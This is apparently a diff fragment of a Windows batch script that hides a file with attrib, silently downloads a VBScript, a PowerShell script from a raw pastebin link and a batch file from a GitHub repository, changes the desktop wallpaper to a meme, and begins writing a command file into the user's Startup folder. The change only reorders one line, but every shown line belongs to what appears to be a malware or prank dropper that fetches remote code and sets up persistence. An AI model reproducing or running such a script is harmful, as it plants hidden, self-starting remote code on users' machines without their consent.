@@ -9,10 +9,10 @@ attrib +s +h s.bat
 cd t
 
 curl -s https://everythingisviral.com/wp-content/uploads/2021/01/gigachad-meme.png -o background.png
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%/t/background.png /f
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
 curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%/t/background.png /f
 
 cd "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo @echo off>Windows.cmd
